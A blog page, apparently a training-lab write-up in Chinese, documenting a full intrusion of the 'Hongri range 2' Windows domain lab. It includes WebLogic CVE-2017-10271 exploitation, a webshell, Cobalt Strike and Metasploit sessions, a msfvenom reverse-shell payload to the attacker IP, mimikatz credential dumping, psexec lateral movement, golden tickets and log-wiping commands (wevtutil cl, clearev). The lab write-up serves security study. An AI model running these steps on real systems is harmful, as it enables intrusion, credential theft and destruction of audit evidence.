@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/blog/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/blog/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/blog/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/blog/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Nato+Serif+SC:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"luomubing-lin.github.io","root":"/blog/","images":"/blog/images","scheme":"Mist","darkmode":false,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/blog/js/config.js" defer></script>
+
+    <meta name="description" content="环境拓扑![](&#x2F;images&#x2F;Pasted image 20251216140643.png) 虚拟网络配置 ![](&#x2F;images&#x2F;Pasted image 20251216143242.png)环境说明：内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24防火墙策略（策略设置过后，测试机只能访问192段地">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场2">
+<meta property="og:url" content="https://luomubing-lin.github.io/2025/12/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html">
+<meta property="og:site_name" content="Mul1n&#39;s Blog">
+<meta property="og:description" content="环境拓扑![](&#x2F;images&#x2F;Pasted image 20251216140643.png) 虚拟网络配置 ![](&#x2F;images&#x2F;Pasted image 20251216143242.png)环境说明：内网网段：10.10.10.1&#x2F;24DMZ网段：192.168.111.1&#x2F;24防火墙策略（策略设置过后，测试机只能访问192段地">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-14-51-38.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-16-07-34.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-16-25-59.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-16-37-14.png">
+<meta property="og:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-17-14-17.png">
+<meta property="article:published_time" content="2025-12-16T09:40:51.000Z">
+<meta property="article:modified_time" content="2025-12-16T10:09:08.365Z">
+<meta property="article:author" content="mul1n">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://luomubing-lin.github.io/blog/images/sec-kali-2025-12-16-14-51-38.png">
+
+
+<link rel="canonical" href="https://luomubing-lin.github.io/2025/12/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://luomubing-lin.github.io/2025/12/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/","path":"2025/12/16/红日靶场2/","title":"红日靶场2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>红日靶场2 | Mul1n's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/blog/js/utils.js" defer></script><script src="/blog/js/motion.js" defer></script><script src="/blog/js/sidebar.js" defer></script><script src="/blog/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+<style>
+  body {
+    background: url(/blog/images/back.jpg) no-repeat center center fixed !important;
+    background-size: cover !important;
+  }
+</style>
+  <noscript>
+    <link rel="stylesheet" href="/blog/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/blog/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mul1n's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/blog/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/blog/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/blog/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91"><span class="nav-number">1.</span> <span class="nav-text">环境拓扑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="nav-number">2.2.</span> <span class="nav-text">目录爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="nav-number">3.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CS"><span class="nav-number">3.2.</span> <span class="nav-text">CS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.2.1.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">3.2.2.</span> <span class="nav-text">横向移动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">3.2.3.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF"><span class="nav-number">3.3.</span> <span class="nav-text">MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%AA%E5%90%91"><span class="nav-number">3.3.2.</span> <span class="nav-text">横向</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#psexec%E6%A8%AA%E5%90%91"><span class="nav-number">3.3.2.2.</span> <span class="nav-text">psexec横向</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="nav-number">4.</span> <span class="nav-text">痕迹清除</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="mul1n"
+      src="/blog/images/tou.jpg">
+  <p class="site-author-name" itemprop="name">mul1n</p>
+  <div class="site-description" itemprop="description">此博客用于记录本人的网络安全学习生涯</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/blog/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/blog/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/blog/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://luomubing-lin.github.io/2025/12/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/blog/images/tou.jpg">
+      <meta itemprop="name" content="mul1n">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mul1n's Blog">
+      <meta itemprop="description" content="此博客用于记录本人的网络安全学习生涯">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="红日靶场2 | Mul1n's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-12-16 17:40:51 / Modified: 18:09:08" itemprop="dateCreated datePublished" datetime="2025-12-16T17:40:51+08:00">2025-12-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/blog/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p>![](&#x2F;images&#x2F;Pasted image 20251216140643.png)</p>
+<p>虚拟网络配置</p>
+<p>![](&#x2F;images&#x2F;Pasted image 20251216143242.png)<br><strong>环境说明：</strong><br>内网网段：10.10.10.1&#x2F;24<br>DMZ网段：192.168.111.1&#x2F;24<br>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问)：<br>web主机登录使用de1ay用户登录密码是1qaz@WSX，如果需要管理登录的操作就使用这个账户：administrator&#x2F;1qaz@WSX<br><strong>DC</strong><br>IP: 10.10.10.10<br>OS: windows 2012</p>
+<p><strong>WEB</strong><br>IP1：10.10.10.80<br>IP2： 192.168.111.80<br>OS：Windows 2008<br>管理员运行startweblogic<br>![[WEB.de1ay.com-2025-12-16-14-39-15.png]]</p>
+<p><strong>PC</strong><br>IP1：10.10.10.201</p>
+<p>IP2：192.168.111.201</p>
+<p>OS：Windows 7</p>
+<p><strong>攻击机</strong><br>IP：192.168.111.128<br>OS：kali linux</p>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn 192.168.111.80</span><br></pre></td></tr></table></figure>
+<p><img src="/blog/images/sec-kali-2025-12-16-14-51-38.png"><br>发现7001端口开了weblogic服务</p>
+<h3 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h3><p>使用dirsearch爆破7001端口下的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.111.80:7001</span><br></pre></td></tr></table></figure>
+<p>扫到目录下有一个<br><a target="_blank" rel="noopener" href="http://192.168.111.80:7001/console/login/LoginForm.jsp">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>访问看看<br>![](&#x2F;images&#x2F;Pasted image 20251216150552.png)<br>发现使weblogic server的登录后台，尝试弱口令登录，但是失败了，遂更换思路<br>使用goby进行漏扫<br>WebLogic Server Version: 10.3.6.0<br>由于goby通用poc没有很早以前的weblogic poc，所以这里使用别人扫出来的&#x3D;&#x3D;cve-2017-10271&#x3D;&#x3D;进行渗透</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用weblogicexploit工具<br><img src="/blog/images/sec-kali-2025-12-16-16-07-34.png"><br>命令执行成功，注入蚁剑costom内存马连接上线</p>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看以下进程，发现对方装了360</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>
+<p>没学过免杀，第一次尝试先去web机上关掉360吧</p>
+<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><p><strong>在蚁剑上传cs木马，上线cs</strong><br>进行一波域内信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#先将回显时间修改</span><br><span class="line">sleep 5</span><br><span class="line">#查看工作环境</span><br><span class="line">shell net config workstation</span><br><span class="line">#查看用户</span><br><span class="line">shell net user</span><br><span class="line">#查看域内主机</span><br><span class="line">net view</span><br></pre></td></tr></table></figure>
+<p><img src="/blog/images/sec-kali-2025-12-16-16-25-59.png"><br>得到域控ip<br>使用cs自带进行端口扫描<br>发现域控主机开了445端口</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>使用cs自带的权限提升，选择web监听器<br>成功提权到system</p>
+<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>先抓取明文密码，记录下sid<br>然后进行横移<br><img src="/blog/images/sec-kali-2025-12-16-16-37-14.png"><br>域控主机开了445端口，可以利用smb服务进行横向<br>创建smb监听器<br>使用抓到的administrator账户和密码以及smb监听器进行横向移动<br>成功上线域控DC<br>使用同样的办法也能拿下域内主机PC</p>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>在域控DC上抓取hash<br>![](&#x2F;images&#x2F;Pasted image 20251216164758.png)<br>成功抓到krbtgt的hash值<br>回到web机创建黄金票据<br>![](&#x2F;images&#x2F;Pasted image 20251216164936.png)<br>user任意，domain sid是前面抓明文密码得到的<br>创建<br>成功后可以在web机上使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure>
+<p>访问域内任意主机的文件<br>![](&#x2F;images&#x2F;Pasted image 20251216165331.png)</p>
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>先创建msf反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.111.128 lport=5566 -f exe -o msf.exe</span><br></pre></td></tr></table></figure>
+<p>进入msfconsole<br>进行监听<br>将木马上传蚁剑运行成功上线</p>
+<h4 id="权限维持-1"><a href="#权限维持-1" class="headerlink" title="权限维持"></a>权限维持</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br><span class="line">ps</span><br><span class="line">migrate lsass进程的pid</span><br></pre></td></tr></table></figure>
+<h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#加载mimikatz</span><br><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<p>![](&#x2F;images&#x2F;Pasted image 20251216170939.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#meterpreter放到后台</span><br><span class="line">background</span><br><span class="line">#查看sessions</span><br><span class="line">sessions</span><br></pre></td></tr></table></figure>
+<h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/manage/autoroute</span><br><span class="line">set sessions</span><br><span class="line">run</span><br><span class="line">#检查</span><br><span class="line">routeprint</span><br></pre></td></tr></table></figure>
+<p><img src="/blog/images/sec-kali-2025-12-16-17-14-17.png"><br>这样就可以使攻击机访问到内网</p>
+<h5 id="psexec横向"><a href="#psexec横向" class="headerlink" title="psexec横向"></a>psexec横向</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOSTS 10.10.10.10       # 域控 IP</span><br><span class="line">set SMBDomain de1ay.com       # 域名</span><br><span class="line">set SMBUser administrator     # 域管账号</span><br><span class="line">set SMBPass &lt;你的Hash或密码&gt;   </span><br><span class="line"></span><br><span class="line">set PAYLOAD windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"># 再次检查</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>成功上线域控<br>![](&#x2F;images&#x2F;Pasted image 20251216171922.png)<br>后续黄金票据的生成就没做了</p>
+<h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><p>主要清理weblogic的日志， 用户等创建可以使用隐藏方式创建，痕迹清理也就是原路返回，看看你都做了什么操作。</p>
+<p>　- 有远程桌面权限时手动删除日志：</p>
+<p>　　开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志</p>
+<ul>
+<li>wevtutil：</li>
+</ul>
+<p>　　wevtutil el 列出系统中所有日志名称</p>
+<p>　　wevtutil cl system 清理系统日志</p>
+<p>　　wevtutil cl application 清理应用程序日志</p>
+<p>　　wevtutil cl security 清理安全日志</p>
+<ul>
+<li>meterperter自带清除日志功能：</li>
+</ul>
+<p>　　clearev 清除<strong>windows</strong>中的应用程序日志、系统日志、安全日志</p>
+<ul>
+<li>清除recent：</li>
+</ul>
+<p>　　在文件资源管理器中点击“查看”-&gt;“选项”-&gt;在常规-&gt;隐私中点击”清除”按钮或直接打开C:\Users\Administrator\Recent并删除所有内容或在命令行中输入del &#x2F;f &#x2F;s &#x2F;q “%userprofile%\Recent .</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>weblogic漏洞利用</li>
+<li>psexec横向</li>
+<li>黄金票据</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/blog/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/blog/2025/11/26/xss-labs/" rel="prev" title="xss-labs">
+                  <i class="fa fa-angle-left"></i> xss-labs
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">mul1n</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
